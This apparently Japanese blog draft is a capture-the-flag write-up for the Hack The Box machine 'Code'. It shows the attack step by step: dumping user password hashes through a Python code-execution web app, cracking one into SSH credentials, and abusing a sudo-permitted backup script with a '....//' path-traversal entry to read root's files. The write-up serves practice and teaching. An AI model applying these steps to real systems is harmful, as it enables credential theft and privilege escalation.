+++
author = "Hugo Authors"
title = "HTB Code"
date = "2025-06-01"
description = ""
tags = [
    "HTB",
]
categories = [
    "Security",
    "Programming",
]
image = "https://raw.githubusercontent.com/stark2420/starknote/refs/heads/main/static/image/new-year-ctf-2025/cover.png"
draft = true
+++

HTB Codeのメモ．
<!--more-->

## User Flag

```
nmap -Pn -T4 -sV -sC -A 10.10.11.62
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-04 08:15 JST
Nmap scan report for 10.10.11.62
Host is up (0.32s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd (RSA)
|   256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA)
|_  256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519)
5000/tcp open  http    Gunicorn 20.0.4
|_http-title: Python Code Editor
Aggressive OS guesses: Linux 4.15 - 5.8 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5900/tcp)
HOP RTT       ADDRESS
1   103.91 ms 10.10.16.1
2   105.45 ms 10.10.11.62

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 74.00 seconds   
```

`http://10.10.11.62:5000/`へアクセスすると，pythonコード実行Webアプリ．

一部の単語はフィルタリングされている．

グローバル変数を表示．

```python
print(globals())

---output---
{'__name__': 'app', '__doc__': None, '__package__': '', '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7f97bedc9430>, '__spec__': ModuleSpec(name='app', loader=<_frozen_importlib_external.SourceFileLoader object at 0x7f97bedc9430>, origin='/home/app-production/app/app.py'), '__file__': '/home/app-production/app/app.py', '__cached__': '/home/app-production/app/__pycache__/app.cpython-38.pyc', '__builtins__': {'__name__': 'builtins', '__doc__': "Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the `nil' object; Ellipsis represents `...' in slices.", '__package__': '', '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': ModuleSpec(name='builtins', loader=<class '_frozen_importlib.BuiltinImporter'>), '__build_class__': <built-in function __build_class__>, '__import__': <built-in function __import__>, 'abs': <built-in function abs>, 'all': <built-in function all>, 'any': <built-in function any>, 'ascii': <built-in function ascii>, 'bin': <built-in function bin>, 'breakpoint': <built-in function breakpoint>, 'callable': <built-in function callable>, 'chr': <built-in function chr>, 'compile': <built-in function compile>, 'delattr': <built-in function delattr>, 'dir': <built-in function dir>, 'divmod': <built-in function divmod>, 'eval': <built-in function eval>, 'exec': <built-in function exec>, 'format': <built-in function format>, 'getattr': <built-in function getattr>, 'globals': <built-in function globals>, 'hasattr': <built-in function hasattr>, 'hash': <built-in function hash>, 'hex': <built-in function hex>, 'id': <built-in function id>, 'input': <built-in function input>, 'isinstance': <built-in function isinstance>, 'issubclass': <built-in function issubclass>, 'iter': <built-in function iter>, 'len': <built-in function len>, 'locals': <built-in function locals>, 'max': <built-in function max>, 'min': <built-in function min>, 'next': <built-in function next>, 'oct': <built-in function oct>, 'ord': <built-in function ord>, 'pow': <built-in function pow>, 'print': <built-in function print>, 'repr': <built-in function repr>, 'round': <built-in function round>, 'setattr': <built-in function setattr>, 'sorted': <built-in function sorted>, 'sum': <built-in function sum>, 'vars': <built-in function vars>, 'None': None, 'Ellipsis': Ellipsis, 'NotImplemented': NotImplemented, 'False': False, 'True': True, 'bool': <class 'bool'>, 'memoryview': <class 'memoryview'>, 'bytearray': <class 'bytearray'>, 'bytes': <class 'bytes'>, 'classmethod': <class 'classmethod'>, 'complex': <class 'complex'>, 'dict': <class 'dict'>, 'enumerate': <class 'enumerate'>, 'filter': <class 'filter'>, 'float': <class 'float'>, 'frozenset': <class 'frozenset'>, 'property': <class 'property'>, 'int': <class 'int'>, 'list': <class 'list'>, 'map': <class 'map'>, 'object': <class 'object'>, 'range': <class 'range'>, 'reversed': <class 'reversed'>, 'set': <class 'set'>, 'slice': <class 'slice'>, 'staticmethod': <class 'staticmethod'>, 'str': <class 'str'>, 'super': <class 'super'>, 'tuple': <class 'tuple'>, 'type': <class 'type'>, 'zip': <class 'zip'>, '__debug__': True, 'BaseException': <class 'BaseException'>, 'Exception': <class 'Exception'>, 'TypeError': <class 'TypeError'>, 'StopAsyncIteration': <class 'StopAsyncIteration'>, 'StopIteration': <class 'StopIteration'>, 'GeneratorExit': <class 'GeneratorExit'>, 'SystemExit': <class 'SystemExit'>, 'KeyboardInterrupt': <class 'KeyboardInterrupt'>, 'ImportError': <class 'ImportError'>, 'ModuleNotFoundError': <class 'ModuleNotFoundError'>, 'OSError': <class 'OSError'>, 'EnvironmentError': <class 'OSError'>, 'IOError': <class 'OSError'>, 'EOFError': <class 'EOFError'>, 'RuntimeError': <class 'RuntimeError'>, 'RecursionError': <class 'RecursionError'>, 'NotImplementedError': <class 'NotImplementedError'>, 'NameError': <class 'NameError'>, 'UnboundLocalError': <class 'UnboundLocalError'>, 'AttributeError': <class 'AttributeError'>, 'SyntaxError': <class 'SyntaxError'>, 'IndentationError': <class 'IndentationError'>, 'TabError': <class 'TabError'>, 'LookupError': <class 'LookupError'>, 'IndexError': <class 'IndexError'>, 'KeyError': <class 'KeyError'>, 'ValueError': <class 'ValueError'>, 'UnicodeError': <class 'UnicodeError'>, 'UnicodeEncodeError': <class 'UnicodeEncodeError'>, 'UnicodeDecodeError': <class 'UnicodeDecodeError'>, 'UnicodeTranslateError': <class 'UnicodeTranslateError'>, 'AssertionError': <class 'AssertionError'>, 'ArithmeticError': <class 'ArithmeticError'>, 'FloatingPointError': <class 'FloatingPointError'>, 'OverflowError': <class 'OverflowError'>, 'ZeroDivisionError': <class 'ZeroDivisionError'>, 'SystemError': <class 'SystemError'>, 'ReferenceError': <class 'ReferenceError'>, 'MemoryError': <class 'MemoryError'>, 'BufferError': <class 'BufferError'>, 'Warning': <class 'Warning'>, 'UserWarning': <class 'UserWarning'>, 'DeprecationWarning': <class 'DeprecationWarning'>, 'PendingDeprecationWarning': <class 'PendingDeprecationWarning'>, 'SyntaxWarning': <class 'SyntaxWarning'>, 'RuntimeWarning': <class 'RuntimeWarning'>, 'FutureWarning': <class 'FutureWarning'>, 'ImportWarning': <class 'ImportWarning'>, 'UnicodeWarning': <class 'UnicodeWarning'>, 'BytesWarning': <class 'BytesWarning'>, 'ResourceWarning': <class 'ResourceWarning'>, 'ConnectionError': <class 'ConnectionError'>, 'BlockingIOError': <class 'BlockingIOError'>, 'BrokenPipeError': <class 'BrokenPipeError'>, 'ChildProcessError': <class 'ChildProcessError'>, 'ConnectionAbortedError': <class 'ConnectionAbortedError'>, 'ConnectionRefusedError': <class 'ConnectionRefusedError'>, 'ConnectionResetError': <class 'ConnectionResetError'>, 'FileExistsError': <class 'FileExistsError'>, 'FileNotFoundError': <class 'FileNotFoundError'>, 'IsADirectoryError': <class 'IsADirectoryError'>, 'NotADirectoryError': <class 'NotADirectoryError'>, 'InterruptedError': <class 'InterruptedError'>, 'PermissionError': <class 'PermissionError'>, 'ProcessLookupError': <class 'ProcessLookupError'>, 'TimeoutError': <class 'TimeoutError'>, 'open': <built-in function open>, 'quit': Use quit() or Ctrl-D (i.e. EOF) to exit, 'exit': Use exit() or Ctrl-D (i.e. EOF) to exit, 'copyright': Copyright (c) 2001-2021 Python Software Foundation. All Rights Reserved. Copyright (c) 2000 BeOpen.com. All Rights Reserved. Copyright (c) 1995-2001 Corporation for National Research Initiatives. All Rights Reserved. Copyright (c) 1991-1995 Stichting Mathematisch Centrum, Amsterdam. All Rights Reserved., 'credits': Thanks to CWI, CNRI, BeOpen.com, Zope Corporation and a cast of thousands for supporting Python development. See www.python.org for more information., 'license': Type license() to see the full license text, 'help': Type help() for interactive help, or help(object) for help about object.}, 'Flask': <class 'flask.app.Flask'>, 'render_template': <function render_template at 0x7f97be785ee0>, 'render_template_string': <function render_template_string at 0x7f97be785f70>, 'request': <Request 'http://10.10.11.62:5000/run_code' [POST]>, 'jsonify': <function jsonify at 0x7f97bea31c10>, 'redirect': <function redirect at 0x7f97be89a3a0>, 'url_for': <function url_for at 0x7f97be89a310>, 'session': <SecureCookieSession {}>, 'flash': <function flash at 0x7f97be89a550>, 'SQLAlchemy': <class 'flask_sqlalchemy.extension.SQLAlchemy'>, 'sys': <module 'sys' (built-in)>, 'io': <module 'io' from '/usr/lib/python3.8/io.py'>, 'os': <module 'os' from '/usr/lib/python3.8/os.py'>, 'hashlib': <module 'hashlib' from '/usr/lib/python3.8/hashlib.py'>, 'app': <Flask 'app'>, 'db': <SQLAlchemy sqlite:////home/app-production/app/instance/database.db>, 'User': <class 'app.User'>, 'Code': <class 'app.Code'>, 'index': <function index at 0x7f97bd7d38b0>, 'register': <function register at 0x7f97bd7d3b80>, 'login': <function login at 0x7f97bd7d3c10>, 'logout': <function logout at 0x7f97bd7d3ca0>, 'run_code': <function run_code at 0x7f97bd7d3e50>, 'load_code': <function load_code at 0x7f97bd651040>, 'save_code': <function save_code at 0x7f97bd6511f0>, 'codes': <function codes at 0x7f97bd6513a0>, 'about': <function about at 0x7f97bd651550>}
```

ローカル変数を表示．

```python
print(locals())

---output---
{'code': 'print(locals())\n', 'old_stdout': <_io.TextIOWrapper name='<stdout>' mode='w' encoding='utf-8'>, 'redirected_output': <_io.StringIO object at 0x7fd4ec4cb820>, 'keyword': '__builtins__'}
```

`SQLAlchemy`で`db`や`User`が使われていることがわかる．

`User`テーブルのコラムを表示させる．

```python
print(User.__table__.columns)

---output---
ReadOnlyColumnCollection(user.id, user.username, user.password)
```

要素を表示させる．

```python
users = db.session.query(User).all()

for user in users:
    print(user, user.id, user.username, user.password)

---output---
<User 1> 1 development 759b74ce43947f5f4c91aeddc3e5bad3 <User 2> 2 martin 3de6f30c4a09c27fc71932bfc68474be
```

`3de6f30c4a09c27fc71932bfc68474be`を https://crackstation.net/ で求める．

```
Hash	Type	Result
3de6f30c4a09c27fc71932bfc68474be	md5	    nafeelswordsmaster
```

よって，`martin` / `nafeelswordsmaster` でsshする．

```
$ ssh martin@10.10.11.62
```

```
martin@code:~$ sudo -l
Matching Defaults entries for martin on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User martin may run the following commands on localhost:
    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh

martin@code:~$ cd backups/
martin@code:~/backups$ ls
code_home_app-production_app_2024_August.tar.bz2  home  root  task.json
martin@code:~/backups$ cat task.json
{
        "destination": "/home/martin/backups/",
        "multiprocessing": true,
        "verbose_log": false,
        "directories_to_archive": [
                "/home/app-production/app"
        ],

        "exclude": [
                ".*"
        ]
}

martin@code:~/backups$ vi task.json
{
        "destination": "/home/martin/backups/",
        "multiprocessing": true,
        "verbose_log": false,
        "directories_to_archive": [
                "/home/app-production/user.txt"
        ],

        "exclude": [
                ".*"
        ]
}


martin@code:~/backups$ sudo /usr/bin/backy.sh task.json
2025/06/04 00:08:16 🍀 backy 1.2
2025/06/04 00:08:16 📋 Working with task.json ...
2025/06/04 00:08:16 💤 Nothing to sync
2025/06/04 00:08:16 📤 Archiving: [/home/app-production/user.txt]
2025/06/04 00:08:16 📥 To: /home/martin/backups ...
2025/06/04 00:08:16 📦
martin@code:~/backups$ ls
code_home_app-production_app_2024_August.tar.bz2     home  task.json
code_home_app-production_user.txt_2025_June.tar.bz2  root

martin@code:~/backups$ tar -xjf code_home_app-production_user.txt_2025_June.tar.bz2

martin@code:~/backups/home/app-production$ cat user.txt
20ddb8c8a3d5b21890f4ab37b9954bb6
```

## Privilege escalation

```
martin@code:~/backups$ vi task.json
{
        "destination": "/home/martin/backups/",
        "multiprocessing": true,
        "verbose_log": false,
        "directories_to_archive": [
                "/home/....//root"
        ]
}

martin@code:~/backups$ sudo /usr/bin/backy.sh task.json
2025/06/04 00:26:05 🍀 backy 1.2
2025/06/04 00:26:05 📋 Working with task.json ...
2025/06/04 00:26:05 💤 Nothing to sync
2025/06/04 00:26:05 📤 Archiving: [/home/../root]
2025/06/04 00:26:05 📥 To: /home/martin/backups ...
2025/06/04 00:26:05 📦

martin@code:~/backups$ ls
code_home_app-production_app_2024_August.tar.bz2  home
code_home_.._root_2025_June.tar.bz2               root
task.json

martin@code:~/backups$ tar -xjf code_home_.._root_2025_June.tar.bz2
martin@code:~/backups$ ls root
root.txt  scripts
martin@code:~/backups$ cat root/root.txt
97c3e8d1f4eb9cc328e56fc770eaeffc
```

参考：
https://www.cnblogs.com/QiSamaQwQ/p/18799928